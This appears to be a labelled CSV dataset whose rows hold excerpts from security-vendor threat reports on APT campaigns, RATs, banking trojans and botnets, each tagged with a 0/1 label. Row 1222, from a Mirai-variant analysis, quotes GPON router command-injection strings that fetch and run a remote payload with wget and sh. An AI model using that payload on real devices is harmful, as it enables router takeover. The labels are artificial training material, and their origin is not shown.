ID,SPLIT,description,long_tar_train_label
1188,Long_Train,OFFICE SECURITY Get the offer Meet the NEW Bitdefender BOX $249.99 $199.99 BUY NOW Be aware without a care. Special Cybersecurity Awareness Month discount! Find out more COMPARE SOLUTIONS | ALL SOLUTIONS | TRIAL DOWNLOADS | LOGIN TO CENTRAL Business PRODUCTS Small & Medium Business GravityZone Advanced Business Security GravityZone Business Security Bitdefender Security for AWS Enterprise Business GravityZone Ultra Security (XDR) NEW GravityZone Elite Security (HD) NEW GravityZone Enterprise Security Security for Virtualized Environments Security for Endpoints Security for Mobiles Security for Exchange Bitdefender Hypervisor Introspection SERVICE PROVIDERS Cloud Security for MSP Compare Solutions SOLUTIONS Endpoint Security Protect Endpoints Security for SMB Integrated Enterprise Security Datacenter Security Secure Software-Defined Datacenter Secure Hyperconverged Infrastructure,0
1189,Long_Train,"first observed apparent tests of this RAT in late February 2017. In May 2017, “Revcode” advertises his RAT “WebMonitor” at hackforums[.]net (Figure 1) for €14.99 – €29.99 (Figure 2): “[#1 Web RAT, CONTROL FROM WEB BROWSER, No PORTFORWARD, KEYLOGGER, + VPN]”. Figure 2 – Editions of WebMonitor RAT sold at three different pricepoints. In addition to forum sales thread, Revcode’s main sales and support site is at revcode[.] eu (Figure 3). Figure 3 – Screenshot of revcode[.]eu advertising WebMonitor Features On the server-side, WebMonitor offers an included VPN and C2 service (discussed in detail later in this report), with a web-based interface (Figure 4). Figure 4 – Web-based C2 interface WebMonitor offers two interface options: the original “Lite” version, and a slicker interface in the “Enterprise” version. A list of features is provided at the site, some of which stretch the guise of a legitimate administration tool: Applications App",0
1190,Long_Train,"and criminals that Volexity detailed in a previous blog post title Drupal Vulnerability: Mass Scans & Targeted Exploitation . In a post dated April 13, 2018, the Drupal team stated the following: The security team is now aware of automated attacks attempting to compromise Drupal 7 and 8 websites using the vulnerability reported in SA-CORE-2018-002. Due to this, the security team is increasing the security risk score of that issue to 24/25. Sites not patched by Wednesday, 2018-04-11 may be compromised. This is the date when evidence emerged of automated attack attempts. It is possible targeted attacks occurred before that. On Friday, April 13, 2018, public exploit code for the vulnerability was made widely available and large scale scanning and exploitation followed. Drupalgeddon 2 Since early Friday (4/13), through its network security monitoring service, Volexity has observed thousands of scan and exploitation attempts for this latest Drupal vulnerability. If an unpatched server is found, the vulnerability allows for unauthenticated remote code execution under the privileges",0
1191,Long_Train,"during our investigation. Identified as XiaoBa (detected by Trend Micro as PE_XIAOBAMINER), this particular malware is distinctly similar to the XiaoBa ransomware. It seems like the ransomware code was repurposed, adding new capabilities to make it a more destructive cryptocurrency miner. This file infector can be considered destructive since it infects malware binaries, keeping the host code intact but no longer executing it for its original purpose. For example, when an infected calc.exe file with XiaoBaMiner is executed, it will run the malware code but will no longer run the main calc.exe routine. Infected for Mining Purposes Besides infecting binaries, XiaoBa is also a cryptocurrency miner. It injects the Coinhive mining script to",0
1192,Long_Train,"group’s main targets. Recent activity of the group against US organizations was discussed in a US-CERT advisory, which linked the actor to the Russian government, as well as an advisory by the UK National Cyber Security Centre . This report by Kaspersky Lab ICS CERT presents information on identified servers that have been infected and used by the group. The report also includes the findings of an analysis of several webservers compromised by the Energetic Bear group during 2016 and in early 2017 . Attack victims The table below shows the distribution of compromised servers (based on the language of website content and/or the origins of the company renting the server at the time of compromise) by countries, attacked company types and the role of each server in the overall attack scheme. Victims of the threat actor’s attacks were not limited to industrial companies. Table 1. Compromised servers Country Description Role in the attack Russia Opposition political website Waterhole Real estate agency Auxiliary (collecting user data in the waterhole attack) Football club Waterhole Developer and integrator of secure automation systems and IS consultant Waterhole Developers of software and equipment Auxiliary (collecting user",1
1193,Long_Train,"that they were similar to other samples we sourced. These indicate that, at least for now, RETADUP’s operators — despite their history in deploying their malware in targeted attacks — are focusing on cybercriminal cryptocurrency mining. WORM_RETADUP.A WORM_RETADUP.D WORM_RETADUP.G Scripting Language AutoIt AutoIt AutoHotKey, with some components in AutoIt Propagation Worm, spawns LNK files, propagates in removable drives Worm, spawns LNK files, propagates in removable drives Worm, spawns LNK files, propagates in removable drives Main Payloads Information stealer Cryptocurrency-mining bot Cryptocurrency-mining bot Related Tools Android backdoor Browsing history viewer Campaign Cyberespionage Cybercrime Cybercrime Figure 1. Comparison of RETADUP’s versions Shifting to AutoHotKey RETADUP’s AutoHotKey version bears considerable resemblance to its AutoIt variant in terms of the endgame ( cryptocurrency mining ) and the baselines it uses — the techniques it employs to propagate, evade detection, and install the malicious Monero miner. Apart",0
1194,Long_Train,"URL Shortener Redirects to Github Link The ZIP archive contains a malicious portable executable (PE) file with embedded HTML application (HTA). The user has to unzip the archive and double-click the executable for the infection chain to continue. The PE file is a simple HTA script compiled into an executable. When the user double-clicks the executable, the malicious HTA file is extracted to %temp% and executed by mshta.exe. The HTA script (Figure 4) contains VBS code that fetches a second blob of VBS code encoded in base64 form from hxxp://<redacted>/ilha/pz/logs.php. Figure 4: Contents of HTA File After the second stage of VBS is decoded (Figure 5 and Figure 6), the script downloads the final stage from hxxp://<redacted>/28022018/pz.zip. Figure 5: Contents of Decoded VBS Figure 6: More Contents of Decoded VBS The downloaded ZIP file contains four files. Two are PE files. One is a legitimate Windows tool, pvk2pfx.exe, that is abused for DLL side-loading. One is the malicious banking Trojan as the DLL. The VBS code unzips the archive, changes the extension of the legitimate Windows tool from .png to .exe, and renames the malicious DLL as",1
1195,Long_Train,"has largely focused its operations within the Middle East. We assess that APT34 works on behalf of the Iranian government based on infrastructure details that contain references to Iran, use of Iranian infrastructure, and targeting that aligns with nation-state interests. APT34 uses a mix of public and non-public tools, often conducting spear phishing operations using compromised accounts, sometimes coupled with social engineering tactics. In May 2016, we published a blog detailing a spear phishing campaign targeting banks in the Middle East region that used macro-enabled attachments to distribute POWBAT malware. We now attribute that campaign to APT34. In July 2017, we observed APT34 targeting a Middle East organization using a PowerShell-based backdoor that we call POWRUNER and a downloader with domain generation algorithm functionality that we call BONDUPDATER, based on strings within the malware. The backdoor was delivered via a malicious .rtf file that exploited CVE-2017-0199 . In this latest campaign, APT34 leveraged the recent Microsoft Office vulnerability CVE-2017-11882 to deploy POWRUNER and BONDUPDATER. The full report on APT34 is available to our MySIGHT",1
1196,Long_Train,"server. Sending a list of documents with file extensions including .doc, .odt, .xls, .ppt, .pdf and more. Logging details about the system. Rebooting the system. Self-destructing the executable. While it is not clear exactly what the attacker is looking for, what is clear is that once he finds it, a second stage of the attack awaits, fetching additional modules and/or malware from the Command and Control server. This then is a surveillance attack in progress and has been dubbed ‘Big Bang’ due to the attacker’s fondness for the ‘Big Bang Theory’ TV show, after which some of the malware’s modules are named. A previous campaign of this APT group was uncovered by Talos in June 2017, and since then very little of this operation was seen in the wild. The Big Bang campaign described below incorporates improved capabilities and offensive infrastructure, and seems to be even more targeted. What’s New in Ramallah? The first instances of the current",0
1197,Long_Train,"drive is an uncommon attack technique and likely done in an effort to spread to air-gapped systems, which are systems that do not connect to the public internet. In addition, our research shows that the malware used in these attacks will only try to infect systems running Microsoft Windows XP or Windows Server 2003. This is despite the fact that the malware appears to have been created when newer versions of Windows software were available. This would seem to indicate an intentional targeting of older, out-of-support versions of Microsoft Windows installed on systems with no internet connectivity. Air-gapped systems are common practice in many countries for government, military, and defense contractors, as well as other industry verticals. We have not identified any public reporting on this attack, and we suspect the Tick group used the malware described in this report in attacks multiple years ago. Based on the data collected, we do not believe this malware is part of any active threat campaign. Our picture of this past attack is incomplete at this time. Based on our",1
1198,Long_Train,"to its spam campaigns in the last quarter of 2017. Instead, we see Necurs pushing cryptocurrency miners and infostealers — FlawedAmmyy RAT, AZORult, and a .NET module — as modules onto its bots. Necurs pushes XMRig to its bots to mine Monero In March, we saw Necurs pushing a Monero Miner — XMRig — to its bots. At the time we checked it, the wallet owner was able to earn around $USD 1,200.00 in 24 hours. Figure 1. A screen capture showing the wallet owner’s earnings using the XMRig to mine Monero. The user in the configuration of this XMRig module is “47CCqA1ERkT6jUT8yhgJj7dkdHXhBw86 xiKsCdZ6auDmCC3mAQLpBxP2nhpGuHA27tToNeZM98Tz FKe6vjCajdHdCz67iRB.worker” . In April, we observed that it pushed the remote access trojan FlawedAmmyy onto its bots. FlawedAmmyy is trojanized from a legitimate remote access tool Ammyy Admin. Like the remote desktop",0
1199,Long_Train,"the ESET security community Certificates stolen from Taiwanese tech‑companies misused in Plead malware campaign D-Link and Changing Information Technologies code-signing certificates stolen and abused by highly skilled cyberespionage group focused on East Asia, particularly Taiwan Anton Cherepanov 9 Jul 2018 - 12:28PM Share D-Link and Changing Information Technologies code-signing certificates stolen and abused by highly",1
1200,Long_Train,"the ability to analyze the malware’s dynamic (runtime) behaviour. Recently, we identified a suspicious executable which showed intriguing behaviour in our sandbox. The executable injected code into a legitimate windows binary (svchost.exe), and the injected code triggered one of our memory detections which aims to identify information stealing malware . The injected process ended abruptly and displayed an error message which didn’t make any sense relative to the type of code which the process contained: “The configuration file is missing. Re-installing Easy Backup may fix this problem”. Image one: Decoy messagebox displayed by AdKoob This odd behaviour prompted us to analyze the malware in depth. We took a jump down the rabbit hole, leading to the discovery of a previously undocumented threat, which we’re calling AdKoob . It’s a credential stealing malware with a twist: It also exfiltrates data from your Facebook account to an unknown recipient. Evading detection and sandbox",0
1201,Long_Train,"Lookout Mobile Endpoint Security McAfee Endpoint Protection MobileIron VMware Workspace ONE® IBM MaaS360 Lookout Mobile Endpoint Security McAfee Endpoint Protection Threat Detection and Response Strategy, assessment and planning Incident response and forensics AT&T threat solutions Managed threat detection and response USM Anywhere USM for MSSPs Free Tools Open threat exchange OSSIM Strategy, assessment and planning Incident response and forensics AT&T threat solutions Managed threat detection and response USM Anywhere USM for MSSPs Free Tools Open threat exchange OSSIM Solutions See All Solutions Compliance Overview GDPR HIPAA ISO 27001 PCI DSS SOC 2 Industry Education Energy sector Federal Financial services Healthcare Manufacturing MSSPs Retail Environment AWS Azure Cloud IOT/Mobility Hybrid Network Security use cases Asset discovery Endpoint detection & response Intrusion detection Secure web gateway SIEM & log management Threat detection Threat intelligence Vulnerability assessment Zero Trust architecture View All Solutions &LongRightArrow; Partners Become a Partner All partner programs MSSP program Reseller program Partner Portal",0
1202,Long_Train,"the file. These files have most recently been found in use by criminals to deliver commodity RATs such as Flawed Ammyy. In DarkHydrus’s case, the preferred payload retrieved in their previous attacks were exclusively open-source legitimate tools which they abuse for malicious purposes, such as Meterpreter and Cobalt Strike. However, in this instance, it appears that this group used a custom PowerShell based payload that we call RogueRobin. Attack Analysis The actors sent the spear-phishing emails between July 15 and 16. Each of the emails had a password protected RAR archive attached named credential.rar. The body of the message, seen in Figure 1 was written in Arabic and asks the recipient to review the document within the archive. The message also includes the password 123456 that is required to open the RAR archive. The credential.rar archive contained a malicious .iqy file named credential.iqy. Figure 1 Message body in delivery email Google Translate renders the Arabic message as: Hi Please review and review the attached file Gratefully Password: 123456 Payload Analysis The credential.iqy is an .iqy file (SHA256: cc1966eff7bed11c1faada0bb0ed0c8715404abd936cfa816cef61863a0c1dd6 ) that contains nothing more than the following text string: hxxp://micrrosoft[.]net/releasenotes.txt Microsoft Excel natively opens .iqy",0
1203,Long_Train,"exploit using heuristics, which led to a more in-depth analysis. Interestingly, we found that this exploit sample uses the same obfuscation technique as exploits for CVE-2018-8174 , a VBScript engine remote code execution vulnerability patched back in May. Figure 2. Comparison of CVE-2018-8373 (left side) and CVE-2018-8174 (right side) Moreover, here’s the sample exploit’s method for running shellcode: Figure 3. Comparison of how shellcode is run by CVE-2018-8373 (left side) and CVE-2018-8174 (right side) We suspect that this exploit sample came from the same creator. Our analysis revealed that it used a new use-after-free (UAF) vulnerability in vbscript.dll. Vulnerability Root Cause Analysis We now detail our analysis of this vulnerability, which has been addressed in Microsoft’s August Patch Tuesday . Because the",0
1204,Long_Train,"the Google Play Store in the past few months. The app creators often disguise their Trojan as a financial, automotive or a shopping application, but in reality, it functions as a downloader. Once activated, the Anubis app fetches the main malicious payload, which is designed to steal banking credentials and provide remote control functionality of the compromised device to the botnet owners. Google swept clean the Play Store after Anubis was first discovered. But we didn’t get much of a break; New Anubis downloaders were recently spotted on the Play Store. The persistence of this banking malware family merits us taking a closer look at its functionality. So what is Anubis exactly? No, this post is not about the ancient Egyptian god of embalming and the dead. Anubis is a banking trojan and bot derived from the Maza-in banking Trojan source code leak we wrote",1
1205,Long_Train,"focused primarily on political news and events. Based on this, we believe the Rancor attackers were targeting political entities. Additionally, these decoy documents are hosted on legitimate websites including a government website belonging to the Cambodia Government and in at least once case, Facebook. The malware and infrastructure used in these attacks falls into two distinct clusters, which we are labeling A and B, that are linked through their use of the PLAINTEE malware and several “softer” linkages. Linking the attacks Building on our previous research into KHRAT Trojan , we have been monitoring KHRAT command and control domains. In February 2018, several KHRAT associated domains began resolving to the IP address 89.46.222[.]97. We made this IP the center of our investigation. Examining passive DNS (pDNS) records from PassiveTotal revealed several domain names associated with this IP that mimic popular technology companies. One of these domains, facebook-apps[.]com, was identified in one of the malware samples associated with this IP address. The following table depicts the two malware samples that are directly related to this IP address: SHA256 Description Connection to IP 0bb20a9570a9b1e3a72203951268ffe83af6dcae7342a790fe195a2ef109d855 Loader C2 facebook-apps.com (resolves to 89.46.222.97) c35609822e6239934606a99cb3dbc925f4768f0b0654d6a2adc35eca473c505d PLAINTEE Hosted on 89.46.222.97 Digging in further, the malware family we later named “PLAINTEE” appears to be quite unique with only six samples present in our data set. Apart from one sample (c35609822e6239934606a99cb3dbc925f4768f0b0654d6a2adc35eca473c505d), we were able to link all PLAINTEE samples together by the infrastructure they use. The diagram in Figure 1 shows the samples, domains, IP addresses and e-mail addresses that we identified during our investigation (See Appendix B for more detail on these.) There is a clear split between Cluster A and Cluster B,",1
1206,Long_Train,"when certain conditions are met; avoiding infection when security suites are installed or the sample is being run in an analysis environment. From the target list retrieved from the final payload, this particular campaign targets customers of several Mexican banking institutions and contains some comments embedded in the code written in the Spanish language, using words only spoken in Latin America.",1
1207,Long_Train,"and make a detailed comparison between it and the notorious HERMES ransomware used in other operations. We also address the financial aspects of the campaign and illustrate how, through tracking the money trail, Ryuk’s authors seem to want to disguise their received payments by dividing and transferring them among multiple wallets. An Overview of Ryuk Unlike the common ransomware, systematically distributed via massive spam campaigns and exploit kits, Ryuk is used exclusively for tailored attacks. In fact, its encryption scheme is intentionally built for small-scale operations, such that only crucial assets and resources are infected in each targeted network with its infection and distribution carried out manually by the attackers. This, of course, means extensive network mapping, hacking and credential collection is required and takes place prior to each operation. Its alleged attribution to Lazarus Group, discussed later in this post, may imply that the attackers are already well experienced in the targeted attacks domain, as seen by attacks such as the breach of Sony Pictures in 2014. Ryuk’s Ransom Note While no differences were found in the collected samples, two versions of ransom notes were sent to victims; a longer, well-worded and nicely phrased note, which led to the highest recorded payment of 50 BTC (around $320,000), and a shorter, more blunt note, which was sent to various other organizations and also led to some fine ransom payments ranging between 15-35 BTC (up to $224,000). This could imply there may be two levels of offensive. Figure 1: Ransom Note",0
1208,Long_Train,"Another interesting element of this malware is the included paragraph, shown below. Figure 02. Invitation in Russian This roughly translates to: Closed dynamic show of modern and prospective samples of military armament and special equipment for the “reconnaissance and raid action of combined-arms units” While the event is open to anyone, organizers from last year have set up specialized expositions that include “ demonstrations behind closed doors.” This caters to selected guests, where pieces of classified equipment are being displayed, including large aerial vehicles and missiles. That being said, we believe that this malicious document is being targeted to those selected guests who want to be, or are already included in these closed door invitations. This year’s event has already 66 official foreign delegations confirming their participation. We will take a look on how a PPSX file could compromise an unpatched system. Analysis We begin with the malicious PPSX file that",1
1209,Long_Train,"tools and infrastructure needed to build and maintain a botnet. Within Cisco's Advanced Malware Protection (AMP) telemetry, we have observed several instances of attempts to install this RAT on various endpoints. As described below, we have also seen multiple malware campaigns distributing Remcos, with many of these campaigns using different methods to avoid detection. To help people who became victims of a harmful use of Remcos, Talos is providing a decoder script that can extract the C2 server addresses and other information from the Remcos binary. Please see the Technical Details section below for more information. Technical Details Remcos distribution in the wild Talos has observed several malware campaigns attempting to spread Remcos to various victims. Since Remcos is advertised and sold on numerous hacking-related forums, we believe it is likely that multiple unrelated actors are leveraging this malware in their attacks using a variety of different methods to infect systems. Earlier this year, RiskIQ published a report regarding an attacker who was reportedly targeting defense contractors in Turkey. Since then, this threat actor has continued to operate and has been observed targeting specific types of organizations. Talos has confirmed that in addition to defense contractors, this attacker has also targeted other organizations such as: International news agencies; Diesel equipment manufacturers and service providers operating within the maritime and energy sector; and HVAC service providers operating within the energy sector. In all of the observed campaigns, the attack begins with specially crafted spear phishing emails written in Turkish. The emails appear as if they were sent from a Turkish government agency and purport to be related to tax reporting for the victim's organization. Below is an",1
1210,Long_Train,"All Categories Application Security Identity & Access Artificial Intelligence Incident Response CISO Mainframe Cloud Security Mobile Security Data Protection Network Endpoint Risk Management Fraud Protection Threat Hunting Security Services Security Intelligence & Analytics Industries Banking & Finance Energy & Utility Government Healthcare Retail Threat Research Podcast Events Home / Threat Research / Malware BackSwap Malware Now Targets Six Banks in Spain August 22, 2018 | By Limor Kessem co-authored by Tomer Agayev | 3 min read",1
1211,Long_Train,"internet access Global Security Gateway Network based firewalls Premises based firewalls Enhanced cybersecurity services AT&T infrastructure and application protection Reactive distributed denial of service defense AT&T application layer security Endpoint Security Endpoint Security MobileIron VMware Workspace ONE® IBM MaaS360 Lookout Mobile Endpoint Security McAfee Endpoint Protection MobileIron VMware Workspace ONE® IBM MaaS360 Lookout Mobile Endpoint Security McAfee Endpoint Protection Threat Detection and Response Strategy, assessment and planning Incident response and forensics AT&T threat solutions Managed threat detection and response USM Anywhere USM for MSSPs Free Tools Open threat exchange OSSIM Strategy, assessment and planning Incident response and forensics AT&T threat solutions Managed threat detection and response USM Anywhere USM for MSSPs Free Tools Open threat",0
1212,Long_Train,"past two years. The campaigns, which we are collectively naming RedAlpha, combine light reconnaissance, selective targeting, and diverse malicious tooling. We discovered this activity as the result of pivoting off of a new malware sample observed targeting the Tibetan community based in India. Insikt Group’s analysis of infrastructure overlap among the new campaigns reveals wider targeting of the Chinese “Five Poisons, 2 ” in addition to South and Southeast Asian governments. Based on the campaign’s targeting of “Five Poisons”-related organizations, overlapping infrastructure, and links to malware used by other Chinese APTs uncovered during our research, we assess with medium confidence that the RedAlpha campaigns were conducted by a Chinese APT. Key Judgements The two newly discovered RedAlpha campaigns targeting the Tibetan community took place in 2017 and 2018. For ease of reference, we’ll call them the “2017 hktechy” and “2018 internetdocss” campaigns, after their command-and-control (C2) servers. Attacker tradecraft evolved from bespoke malware consisting of a custom dropper and the NetHelp infostealer implant in 2017 to a custom validator and njRAT commodity malware in 2018. The 2018 internetdocss campaign also leveraged scaled-down infrastructure to possibly reduce the impact of discovery and avoid the loss of proprietary tools and costly to maintain infrastructure. Both campaigns involved the use of payloads configured with several C2 servers; however, malware from both campaigns made use of the doc.internetdocss[.]com C2 domain, thus tying both campaigns together. A malicious Microsoft Word document that exploited CVE-2017-0199 was also used during the RedAlpha campaigns. This sample was first seen in the wild during the 57-day CNNVD vulnerability publication lag highlighted by previous Recorded Future research, further supporting the theory that the delay in publication by CNNVD was to enable Chinese threat actors to operationalize the exploit. Interesting connections to previous activity include the historic use of FF-RAT and common infrastructure used by NetTraveler, Icefog, and DeputyDog APTs, as well as the MILE TEA campaign. Background For many years, Tibetan and Uyghur communities have been targeted by many threat actors via exploits , phishing , watering hole attacks , and malware exploiting multiple platforms, including Windows , MacOS , and more recently, Android . Unsurprisingly, the attackers include multiple Chinese threat actors, among them the original Winnti group , LuckyCat , and NetTraveler , but also others like MiniDuke and Equation Group . Aiding targeted communities allows researchers to discover emerging malicious campaigns while protecting victims, but recurring discovery has done little to ultimately deter attackers. The RedAlpha campaigns began in mid-2017 by targeting the Tibetan community in India. The latest campaign remains ongoing, with new subdomains registered in late April 2018. The threat actor utilized a careful combination of victim reconnaissance and fingerprinting, followed by selective targeting with multi-stage malware. The malware utilized changed",1
1213,Long_Train,"first time we have identified a malware that uses Naver — which is known for its popularity in South Korea. One of the most interesting questions we still have is regarding attribution — and who is behind this malware. Previously, we published several articles concerning Group123 ( here , here , here, here and here ). We currently assess with medium confidence that this campaign and NavRAT are linked to Group123. Malicious Document Decoy Document The attack starts with a spear-phishing email containing the HWP document named ""미북 정상회담 전망 및 대비.hwp"" (Prospects for US-North Korea Summit .hwp). This references a legitimate event that could potentially take place on June 12 . Here is a screenshot of the document: This document explains concerns prior to the summit between the U.S. and North Korea, which is expected to focus on the topic of denuclearization. The summit is the latest in a line of signs of diplomatic outreach from North Korea, following the Panmunjom Declaration for Peace, Prosperity and Unification of the Korean Peninsula between South Korea and North Korea on April 27, 2018. This document contains the aforementioned EPS object. This object is used to execute malicious shellcode on the system. This is a seemingly common vector for attackers when using HWP documents, which we have previously encountered and",1
1214,Long_Train,"accounting software used. After that, the attackers look for various ways in which they can commit financial fraud, such as spoofing the bank details used to make payments. In cases where the cybercriminals need additional data or capabilities after infecting a system, such as privilege escalation and obtaining local administrator privileges, the theft of user authentication data for financial software and services, or Windows accounts for lateral movement, the attackers download an additional pack of malware to the system, which is specifically tailored to the attack on each individual victim. The malware pack can include spyware, additional remote administration utilities that extend the attackers’ control on infected systems, malware for exploiting operating system and application software vulnerabilities, as well as the Mimikatz utility, which provides the attackers with Windows account data. Apparently, among other methods, the attackers obtain the information they need to perpetrate their criminal activity by analyzing the correspondence of employees at the enterprises attacked. They may also use the information found in these emails to prepare new attacks – against companies that partner with the current victim. Clearly, on top of the financial losses, these attacks result in leaks of the victim organizations’ sensitive data. Phishing emails In most cases, the phishing emails have finance-related content; the names of attachments also point to their connection with finance. Specifically, some of the emails purport to be invitations to tender from large industrial companies (see below). Malicious attachments may be packed into archives. Some of the emails have",0
1215,Long_Train,about blog malware,0
1216,Long_Train,"fused into one. A mysterious sample enables attackers to execute arbitrary code with the highest privileges on intended targets Late in March 2018, ESET researchers identified an interesting malicious PDF sample. A closer look revealed that the sample exploits two previously unknown vulnerabilities: a remote-code execution vulnerability in Adobe Reader and a privilege escalation vulnerability in Microsoft Windows. The use of the combined vulnerabilities is extremely powerful, as it allows an attacker to execute arbitrary code with the highest possible privileges on the vulnerable target, and with only the most minimal of user",0
1217,Long_Train,"infection vector was an email with a malicious Microsoft Word document attached. The victims were tricked into opening the attachment and enabling the embedded macros. This started the malware-downloading chain, down to the final Smoke Loader infection and its plugins. Smoke Loader is primarily used as a downloader to drop and execute additional malware like ransomware or cryptocurrency miners. Actors using Smoke Loader botnets have posted on malware forums attempting to sell third-party payload installs. This sample of Smoke Loader did not transfer any additional executables, suggesting that it may not be as popular as it once was, or it’s only being used for private purposes. The plugins are all designed to steal sensitive information from the victim, specifically targeting stored credentials or sensitive information transferred over a browser — including Windows and Team Viewer credentials, email logins, and others. Technical details Infection Chain As mentioned above, the infection chain started with an email and an attached malicious Word document ( b98abdbdb85655c64617bb6515df23062ec184fe88d2d6a898b998276a906ebc ). You can see the content of this email below. Fig. 1 - Phishing Email The attached Word",1
1218,Long_Train,"apps, including the messaging apps WhatsApp and Telegram, that were then deployed by the MDM onto the 13 targeted devices in India. The purpose of the BOptions sideloading technique is to inject a dynamic library in the application. The malicious code inserted into these apps is capable of collecting and exfiltrating information from the device, such as the phone number, serial number, location, contacts, user's photos, SMS and Telegram and WhatsApp chat messages. Such information can be used to manipulate a victim or even use it for blackmail or bribery. Thanks to the logs located on the MDM servers and the malware's command and control (C2) server, we were able to determine that the malware has been in use since August 2015. The campaign targeted only a few select devices (13) that are all located in India. The attacker left essential data on the servers, such as emails and usernames. As part of the attacker's development and testing it appears that they compromised their device — we observed a device named ""test"" or ""mdmdev."" The log files we identified contain the phone number of the device. The number originates from India and uses the ""Vodafone India"" network with roaming capability disabled. With all of this information in mind, we assume with high confidence that the malware author works out of India. MDM is becoming more popular throughout large enterprises, and users should be aware that installing additional certificates on their device to allow remote management can result in potential malicious activity. By",0
1219,Long_Train,Support Forums Release history Lifecycle policy User Guides,0
1220,Long_Train,Global Security Gateway Network based firewalls Premises based firewalls Enhanced cybersecurity services AT&T infrastructure and application protection Reactive distributed denial of service defense AT&T application layer security AT&T trusted internet access Global Security Gateway Network based firewalls Premises based firewalls Enhanced cybersecurity services AT&T infrastructure and application protection Reactive distributed denial of service defense AT&T application layer security Endpoint Security Endpoint Security MobileIron VMware Workspace ONE® IBM MaaS360 Lookout Mobile Endpoint Security McAfee Endpoint Protection MobileIron VMware Workspace ONE® IBM MaaS360 Lookout Mobile Endpoint Security McAfee Endpoint Protection Threat,0
1221,Long_Train,"Emotet and Trickbot focus on individual malware characteristics, and they do little to paint a complete picture of a successful infection chain. This blog post examines Emotet malspam so far in 2018, and we take a closer look at a Emotet infection traffic featuring Trickbot. Similarities Although Emotet and Trickbot are from different malware families, they have some similarities. Both are information stealers that can load additional modules for functions like spamming or worm-based propagation. And for the last year or so, both have been distributed through malspam using Microsoft Word documents as the initial infection vector. Emotet Emotet was first reported in the summer of 2014 as banking malware , but has since evolved. By 2017, various sources reported Emotet acting as a loader for other malware like Dridex. One source reported Emotet loading Trickbot , so this most recent combination is not without precedent. In",1
1222,Long_Train,"exploring samples belonging to one of these campaigns, I also discovered they support several new DDoS methods previously unused by Mirai variants. This blog post details each campaign (in the chronological order they were observed) along with the exploits used, the new DDoS methods supported, ending in a comparative summary of the campaigns. Also covered is the tangential discovery of some Gafgyt samples incorporating new Layer 7 DDoS functionality targeting a known DDoS-protection provider. IOCs for different campaigns, if not mentioned under the corresponding section, can be found at the end of this blog post. CAMPAIGN 1: An evolution of Omni In May 2018 , the Omni botnet, a variant of Mirai, was found exploiting two vulnerabilities affecting Dasan GPON routers – CVE-2018-10561 (authentication bypass) and CVE-2018-1562 (command injection). The two vulnerabilities used in conjunction allow the execution of commands sent by an unauthenticated remote attacker to a vulnerable device. Since then the same family has evolved to incorporate several more exploits, detailed in Table 1. I used the sample below for this analysis SHA256 3908cc1d8001f926031fbe55ce104448dbc20c9795b7c3cfbd9abe7b789f899d VULNERABILITY AFFECTED DEVICES EXPLOIT FORMAT CVE-2018-10561, CVE-2018-10562 Dasan GPON routers XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host= ;wget+http://%s/gpon80+-O+->/tmp/gpon80;sh+/tmp/gpon80&ipv=0 XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host= ;wget+http://%s/gpon8080+-O+->/tmp/gpon8080;sh+/tmp/gpon8080&ipv=0 CVE-2014-8361 Different devices using the Realtek SDK with the miniigd",1
1223,Long_Train,"years, until May 2018, Calisto remained off the radar of antivirus solutions, with the first detections on VT appearing only recently. Malware for macOS is not that common, and this sample was found to contain some suspiciously familiar features. So we decided to unpick Calisto to see what it is and why its development was stopped (or was it?). Propagation We have no reliable information about how the backdoor was distributed. The Calisto installation file is an unsigned DMG image under the guise of Intego’s security solution for Mac. Interestingly, Calisto’s authors chose the ninth version of the program as a cover which is still",0
1224,Long_Train,"payload challenging to analyze. Underminer appears to be an exploit kit that was created in November 2017. In this case, however, the exploits used included ones that exploited Flash vulnerabilities and delivered the payloads filelessly until the malware is installed. Underminer’s activity in July 17 revealed it is distributing its payloads mainly to Asian countries. Hidden Mellifera emerged in May, and reportedly affected as much as 500,000 machines. Hidden Mellifera’s authors were also linked to the browser-hijacking trojan Hidden Soul reported in August 2017. This correlation indicates that Underminer was developed by the same cybercriminals, as Underminer also pushed Hidden Mellifera. Conversely, Underminer was delivered via an advertising server whose domain was registered using an",1
